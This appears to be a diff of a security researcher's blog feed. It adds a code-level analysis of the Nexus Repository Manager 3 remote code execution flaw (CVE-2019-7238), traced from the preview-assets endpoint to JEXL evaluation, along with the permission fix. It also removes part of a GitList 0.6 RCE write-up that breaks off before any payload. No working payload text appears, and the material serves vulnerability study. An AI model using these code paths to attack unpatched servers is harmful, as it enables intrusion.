@@ -241,6 +241,76 @@
   </entry>
   
   <entry>
+    <title>Nexus Repository Manager 3 RCE 分析 -【CVE-2019-7238】</title>
+    <link href="http://chybeta.github.io/2019/02/18/Nexus-Repository-Manager-3-RCE-%E5%88%86%E6%9E%90-%E3%80%90CVE-2019-7238%E3%80%91/"/>
+    <id>http://chybeta.github.io/2019/02/18/Nexus-Repository-Manager-3-RCE-分析-【CVE-2019-7238】/</id>
+    <published>2019-02-18T13:49:10.000Z</published>
+    <updated>2019-02-20T02:35:50.092Z</updated>
+    
+    <content type="html"><![CDATA[<p>中文版本：<a href="https://xz.aliyun.com/t/4136" target="_blank" rel="external">chinese edition</a><br><a id="more"></a></p>
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p><a href="https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019" target="_blank" rel="external">https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019</a> </p>
+<p>Affected Versions:  Nexus Repository Manager 3.6.2 OSS/Pro versions up to and including 3.14.0</p>
+<p>Fixed in Version:  Nexus Repository Manager OSS/Pro version 3.15.0</p>
+<p>Nice find from Rico @ Tencent Security Yunding Lab and voidfyoo @ Chaitin Tech </p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>In <code>plugins/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/ComponentComponent.groovy:185</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">@Named</span></div><div class="line"><span class="meta">@Singleton</span></div><div class="line"><span class="meta">@DirectAction</span>(action = <span class="string">'coreui_Component'</span>)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentComponent</span></span></div><div class="line">    <span class="keyword">extends</span> <span class="title">DirectComponentSupport</span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="meta">@DirectMethod</span></div><div class="line">    <span class="meta">@Timed</span></div><div class="line">    <span class="meta">@ExceptionMetered</span></div><div class="line">    <span class="function">PagedResponse&lt;AssetXO&gt; <span class="title">previewAssets</span><span class="params">(<span class="keyword">final</span> StoreLoadParameters parameters)</span> </span>&#123;</div><div class="line"></div><div class="line">        String repositoryName = parameters.getFilter(<span class="string">'repositoryName'</span>)</div><div class="line">        String expression = parameters.getFilter(<span class="string">'expression'</span>)</div><div class="line">        String type = parameters.getFilter(<span class="string">'type'</span>)</div><div class="line">        <span class="comment">// get three parameters repositoryName 、 expression 、 type</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!expression || !type || !repositoryName) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// set the repositoryName</span></div><div class="line">        RepositorySelector repositorySelector = RepositorySelector.fromSelector(repositoryName)</div><div class="line"></div><div class="line">        <span class="comment">// according the type to get validator</span></div><div class="line">        <span class="keyword">if</span> (type == JexlSelector.TYPE) &#123;</div><div class="line">            jexlExpressionValidator.validate(expression)</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (type == CselSelector.TYPE) &#123;</div><div class="line">            cselExpressionValidator.validate(expression)</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        List&lt;Repository&gt; selectedRepositories = getPreviewRepositories(repositorySelector)</div><div class="line">        <span class="keyword">if</span> (!selectedRepositories.size()) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">        def result = browseService.previewAssets(</div><div class="line">            repositorySelector,</div><div class="line">            selectedRepositories,</div><div class="line">            expression,</div><div class="line">            toQueryOptions(parameters))</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> PagedResponse&lt;AssetXO&gt;(</div><div class="line">            result.total,</div><div class="line">            result.results.collect(ASSET_CONVERTER.rcurry(<span class="keyword">null</span>, <span class="keyword">null</span>, [:], <span class="number">0</span>)) <span class="comment">// buckets not needed for asset preview screen</span></div><div class="line">        )</div><div class="line">    &#125; </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>Nexus introduced CSEL based selectors to support changes coming in future releases. CSEL is a light version of JEXL used to script queries along specific paths and coordinates available to your repository manager formats. Step in <code>browseService.previewAssets</code>，and its implementations in <code>components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/BrowseServiceImpl.java:233</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Named</span></div><div class="line"><span class="meta">@Singleton</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BrowseServiceImpl</span></span></div><div class="line">    <span class="keyword">extends</span> <span class="title">ComponentSupport</span></div><div class="line">    <span class="keyword">implements</span> <span class="title">BrowseService</span></div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="meta">@Override</span></div><div class="line">  <span class="function"><span class="keyword">public</span> BrowseResult&lt;Asset&gt; <span class="title">previewAssets</span><span class="params">(<span class="keyword">final</span> RepositorySelector repositorySelector,</span></span></div><div class="line">                                          <span class="keyword">final</span> List&lt;Repository&gt; repositories,</div><div class="line">                                          <span class="keyword">final</span> String jexlExpression,</div><div class="line">                                          <span class="keyword">final</span> QueryOptions queryOptions)</div><div class="line">  &#123;</div><div class="line">    checkNotNull(repositories);</div><div class="line">    checkNotNull(jexlExpression);</div><div class="line">    <span class="keyword">final</span> Repository repository = repositories.get(<span class="number">0</span>);</div><div class="line">    <span class="keyword">try</span> (StorageTx storageTx = repository.facet(StorageFacet.class).txSupplier().get()) &#123;</div><div class="line">      storageTx.begin();</div><div class="line">      List&lt;Repository&gt; previewRepositories;</div><div class="line">      <span class="keyword">if</span> (repositories.size() == <span class="number">1</span> &amp;&amp; groupType.equals(repository.getType())) &#123;</div><div class="line">        previewRepositories = repository.facet(GroupFacet.class).leafMembers();</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span> &#123;</div><div class="line">        previewRepositories = repositories;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      PreviewAssetsSqlBuilder builder = <span class="keyword">new</span> PreviewAssetsSqlBuilder(</div><div class="line">          repositorySelector,</div><div class="line">          jexlExpression,</div><div class="line">          queryOptions,</div><div class="line">          getRepoToContainedGroupMap(repositories));</div><div class="line"></div><div class="line">      String whereClause = String.format(<span class="string">"and (%s)"</span>, builder.buildWhereClause());</div><div class="line"></div><div class="line">      <span class="comment">//The whereClause is passed in as the querySuffix so that contentExpression will run after repository filtering</span></div><div class="line">      <span class="keyword">return</span> <span class="keyword">new</span> BrowseResult&lt;&gt;(</div><div class="line">          storageTx.countAssets(<span class="keyword">null</span>, builder.buildSqlParams(), previewRepositories, whereClause),</div><div class="line">          Lists.newArrayList(storageTx.findAssets(<span class="keyword">null</span>, builder.buildSqlParams(),</div><div class="line">              previewRepositories, whereClause + builder.buildQuerySuffix()))</div><div class="line">      );</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>Pay attention to the comment: <code>whereClause</code> will run after repository filtering! We need to know how it is constructed. In the <code>components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/PreviewAssetsSqlBuilder.java:51</code> , which introduce <code>contentExpression</code> and <code>jexlExpression</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreviewAssetsSqlBuilder</span></span></div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">buildWhereClause</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> whereClause(<span class="string">"contentExpression(@this, :jexlExpression, :repositorySelector, "</span> +</div><div class="line">        <span class="string">":repoToContainedGroupMap) == true"</span>, queryOptions.getFilter() != <span class="keyword">null</span>);</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>So after repository filtering，<code>whereClause</code> will run automatically which call <code>contentExpression.execute()</code> method 。In <code>components/nexus-repository/src/main/java/org/sonatype/nexus/repository/selector/internal/ContentExpressionFunction.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContentExpressionFunction</span></span></div><div class="line">    <span class="keyword">extends</span> <span class="title">OSQLFunctionAbstract</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NAME = <span class="string">"contentExpression"</span>;</div><div class="line">  ...</div><div class="line">  <span class="meta">@Inject</span></div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ContentExpressionFunction</span><span class="params">(<span class="keyword">final</span> VariableResolverAdapterManager variableResolverAdapterManager,</span></span></div><div class="line">                                   <span class="keyword">final</span> SelectorManager selectorManager,</div><div class="line">                                   <span class="keyword">final</span> ContentAuthHelper contentAuthHelper)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">super</span>(NAME, <span class="number">4</span>, <span class="number">4</span>);</div><div class="line">    <span class="keyword">this</span>.variableResolverAdapterManager = checkNotNull(variableResolverAdapterManager);</div><div class="line">    <span class="keyword">this</span>.selectorManager = checkNotNull(selectorManager);</div><div class="line">    <span class="keyword">this</span>.contentAuthHelper = checkNotNull(contentAuthHelper);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="meta">@Override</span></div><div class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">execute</span><span class="params">(<span class="keyword">final</span> Object iThis,</span></span></div><div class="line">                        <span class="keyword">final</span> OIdentifiable iCurrentRecord,</div><div class="line">                        <span class="keyword">final</span> Object iCurrentResult,</div><div class="line">                        <span class="keyword">final</span> Object[] iParams,</div><div class="line">                        <span class="keyword">final</span> OCommandContext iContext)</div><div class="line">  &#123;</div><div class="line">    OIdentifiable identifiable = (OIdentifiable) iParams[<span class="number">0</span>];</div><div class="line">    <span class="comment">// asset </span></div><div class="line">    ODocument asset = identifiable.getRecord();</div><div class="line">    RepositorySelector repositorySelector = RepositorySelector.fromSelector((String) iParams[<span class="number">2</span>]);</div><div class="line">    <span class="comment">// jexlExpression 即 iParams[1]</span></div><div class="line">    String jexlExpression = (String) iParams[<span class="number">1</span>];</div><div class="line">    List&lt;String&gt; membersForAuth;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">return</span> contentAuthHelper.checkAssetPermissions(asset, membersForAuth.toArray(<span class="keyword">new</span> String[membersForAuth.size()])) &amp;&amp;</div><div class="line">        checkJexlExpression(asset, jexlExpression, asset.field(AssetEntityAdapter.P_FORMAT, String.class));</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
+<p>According to the code <code>contentExpression(@this, :jexlExpression, :repositorySelector, &quot; +&quot;:repoToContainedGroupMap) == true</code> , you can map contentExpression parameters  to  <code>iParams[i]</code>:</p>
+<ul>
+<li><code>@this</code> -&gt; <code>iParams[0]</code></li>
+<li><code>jexlExpression</code> -&gt; <code>iParams[1]</code></li>
+<li><code>repositorySelector</code> -&gt; <code>iParams[2]</code></li>
+</ul>
+<p>In last, it will call <code>checkJexlExpression()</code> method:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">  ...</div><div class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">checkJexlExpression</span><span class="params">(<span class="keyword">final</span> ODocument asset,</span></span></div><div class="line">                                      <span class="keyword">final</span> String jexlExpression,</div><div class="line">                                      <span class="keyword">final</span> String format)</div><div class="line">  &#123;</div><div class="line">    VariableResolverAdapter variableResolverAdapter = variableResolverAdapterManager.get(format);</div><div class="line"></div><div class="line">    VariableSource variableSource = variableResolverAdapter.fromDocument(asset);</div><div class="line"></div><div class="line">    SelectorConfiguration selectorConfiguration = <span class="keyword">new</span> SelectorConfiguration();</div><div class="line"></div><div class="line">    selectorConfiguration.setAttributes(ImmutableMap.of(<span class="string">"expression"</span>, jexlExpression));</div><div class="line">    <span class="comment">// JexlSelector.TYPE which is defined as 'jexl'</span></div><div class="line">    selectorConfiguration.setType(JexlSelector.TYPE);</div><div class="line">    selectorConfiguration.setName(<span class="string">"preview"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      <span class="comment">// evaluate!!!</span></div><div class="line">      <span class="keyword">return</span> selectorManager.evaluate(selectorConfiguration, variableSource);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (SelectorEvaluationException e) &#123;</div><div class="line">      log.debug(<span class="string">"Unable to evaluate expression &#123;&#125;."</span>, jexlExpression, e);</div><div class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>So, we can step in <code>selectorManager.evaluate</code>，which is implemented in <code>components/nexus-core/src/main/java/org/sonatype/nexus/internal/selector/SelectorManagerImpl.java:156</code> ，and finally evaluate the expression:</p>
+<pre><code class="lang-java">  @Override
+  @Guarded(by = STARTED)
+  public boolean evaluate(final SelectorConfiguration selectorConfiguration, final VariableSource variableSource)
+      throws SelectorEvaluationException
+  {
+
+    Selector selector = createSelector(selectorConfiguration);
+
+    try {
+
+      return selector.evaluate(variableSource);
+    }
+    catch (Exception e) {
+      throw new SelectorEvaluationException(&quot;Selector &#39;&quot; + selectorConfiguration.getName() + &quot;&#39; evaluation in error&quot;,
+          e);
+    }
+  }
+</code></pre>
+<h1 id="Reproducible-steps"><a href="#Reproducible-steps" class="headerlink" title="Reproducible steps"></a>Reproducible steps</h1><p>According to DOCS：<br><a href="https://help.sonatype.com/repomanager3/configuration/repository-management#RepositoryManagement-CreatingaQuery" target="_blank" rel="external">https://help.sonatype.com/repomanager3/configuration/repository-management#RepositoryManagement-CreatingaQuery</a></p>
+<p>To reproduce the issue successfully, we need upload some assets to the repo firstly。For excample, upload a jar:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190218/3.jpg?raw=true" alt=""></p>
+<p>Then go here to intercept  the request:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190218/2.jpg?raw=true" alt=""></p>
+<p>POC：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190218/4.gif?raw=true" alt=""></p>
+<h1 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190218/1.jpg?raw=true" alt=""></p>
+<p>Add the permission requirement: <code>@RequiresPermissions(&#39;nexus:selectors:*&#39;)</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;中文版本：&lt;a href=&quot;https://xz.aliyun.com/t/4136&quot;&gt;chinese edition&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
+    
+      <category term="Nexus" scheme="http://chybeta.github.io/tags/Nexus/"/>
+    
+      <category term="RCE" scheme="http://chybeta.github.io/tags/RCE/"/>
+    
+  </entry>
+  
+  <entry>
     <title>ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</title>
     <link href="http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     <id>http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/</id>
@@ -1577,15 +1647,15 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="RCE" scheme="http://chybeta.github.io/tags/RCE/"/>
     
       <category term="opentsdb" scheme="http://chybeta.github.io/tags/opentsdb/"/>
     
       <category term="远程命令执行" scheme="http://chybeta.github.io/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="RCE" scheme="http://chybeta.github.io/tags/RCE/"/>
     
   </entry>
   
@@ -1641,9 +1711,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="Jenkins" scheme="http://chybeta.github.io/tags/Jenkins/"/>
     
@@ -1696,11 +1766,11 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="weblogic" scheme="http://chybeta.github.io/tags/weblogic/"/>
     
@@ -1919,9 +1989,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
     
@@ -1990,9 +2060,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
@@ -2063,66 +2133,6 @@
       <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
     
       <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>GitList 0.6 Unauthenticated RCE 分析</title>
-    <link href="http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/</id>
-    <published>2018-04-30T04:25:26.000Z</published>
-    <updated>2018-05-01T12:14:53.244Z</updated>
-    
-    <content type="html"><![CDATA[<p>GitList 0.6 Unauthenticated RCE 分析<br><a id="more"></a></p>
-<h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>Gitlist 0.6 下载地址： <a href="https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz" target="_blank" rel="external">https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz</a></p>
-<p>解压出来后，将其中的config.ini-example重命名为config.ini，并将其中第四行修改指向repo的地址，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">repositories[] = &apos;/home/chybeta/test/&apos;</div></pre></td></tr></table></figure></p>
-<p>在<code>test</code>目录下建立repo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir gitlist_rce</div><div class="line">cd gitlist_rce</div><div class="line">echo &quot;chybeta&quot; &gt; README.md</div><div class="line">git init</div><div class="line">git add *</div><div class="line">git commit -m &quot;gitlist_rce&quot;</div></pre></td></tr></table></figure></p>
-<p>其余问题，可以直接参考<a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/1.png?raw=true" alt=""></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在 gitlist/src/Controller/TreeController.php:51行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line">$route-&gt;post(<span class="string">'&#123;repo&#125;/tree/&#123;branch&#125;/search'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $repo, $branch = <span class="string">''</span>, $tree = <span class="string">''</span>)</span> <span class="title">use</span> <span class="params">($app)</span> </span>&#123;</div><div class="line">    $repository = $app[<span class="string">'git'</span>]-&gt;getRepositoryFromName($app[<span class="string">'git.repos'</span>], $repo);</div><div class="line">    <span class="keyword">if</span> (!$branch) &#123;</div><div class="line">        $branch = $repository-&gt;getHead();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $query = $request-&gt;get(<span class="string">'query'</span>);</div><div class="line">    $breadcrumbs = [[<span class="string">'dir'</span> =&gt; <span class="string">'Search results for: '</span> . $query, <span class="string">'path'</span> =&gt; <span class="string">''</span>]];</div><div class="line">    $results = $repository-&gt;searchTree($query, $branch);</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>当我们在repo中进行搜索时，以搜索字符串”chybeta”为例<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/2.png?raw=true" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/master/search HTTP/1.1</div><div class="line"></div><div class="line">query=chybeta</div></pre></td></tr></table></figure>
-<p>则对应的变量即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">repo =&gt; gitlist_rce</div><div class="line">branch =&gt; master</div><div class="line">query =&gt; chybeta</div></pre></td></tr></table></figure></p>
-<p>进入到searchTree函数中，即gitlist/src/Git/Repository.php第320行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $query = escapeshellarg($query);</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
-<p><code>query</code>参数经过了<code>escapeshellarg</code>函数的过滤，<a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="external">官方文档</a>:</p>
-<blockquote>
-<p>escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数。 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符.</p>
-</blockquote>
-<p>之后进入run方法，gitlist/vendor/klaussilveira/gitter/lib/Gitter/Client.php:63：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($repository, $command)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (version_compare(<span class="keyword">$this</span>-&gt;getVersion(), <span class="string">'1.7.2'</span>, <span class="string">'&gt;='</span>)) &#123;</div><div class="line">        $command = <span class="string">'-c "color.ui"=false '</span> . $command;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $process = <span class="keyword">new</span> Process(<span class="keyword">$this</span>-&gt;getPath() . <span class="string">' '</span> . $command, $repository-&gt;getPath());</div><div class="line">    $process-&gt;setTimeout(<span class="number">180</span>);</div><div class="line">    $process-&gt;run();</div></pre></td></tr></table></figure></p>
-<p>在<code>$process = new Process()</code>处最终构成的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;chybeta&apos; master</div></pre></td></tr></table></figure></p>
